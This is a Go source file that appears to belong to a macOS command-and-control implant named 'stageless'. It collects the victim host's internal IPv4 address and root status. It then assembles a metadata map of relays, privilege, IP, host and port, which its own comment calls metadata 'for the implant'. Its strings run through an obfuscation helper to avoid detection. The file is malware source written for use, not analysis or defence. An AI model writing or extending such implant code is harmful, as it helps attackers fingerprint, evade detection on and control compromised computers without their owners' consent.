package general

import (
	"net"
	"os"

	global "stageless/utils"
	"stageless/utils/macapi"
	"stageless/utils/obf"
)

func GetInternalIp() string {
	// Finds the first internal ipv4 address
	ifaces, err := net.Interfaces()
	if err != nil {
		return ""
	}
	for _, iface := range ifaces {
		if iface.Name == macapi.LoopbackName {
			continue
		}
		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}
		for _, addr := range addrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			default:
				continue
			}
			if ip4 := ip.To4(); ip4 != nil {
				return ip4.String()
			}
		}
	}
	return ""
}

func resolvePrivilege() string {
	// Returns the current process privilege
	_, privilege := macapi.FormatProcessPrivilege(os.Geteuid())
	if privilege == obf.S("root") {
		return obf.S("root")
	}
	return obf.S("default")
}

func CreateMetadata() map[string]any {
	// Builds the metadata map for the implant
	return map[string]any{
		obf.S("relays"):       global.ActiveRelayPaths,
		obf.S("privilege"):   resolvePrivilege(),
		obf.S("internal_ip"): GetInternalIp(),
		obf.S("host"):         global.Host,
		obf.S("port"):         global.Port,
	}
}
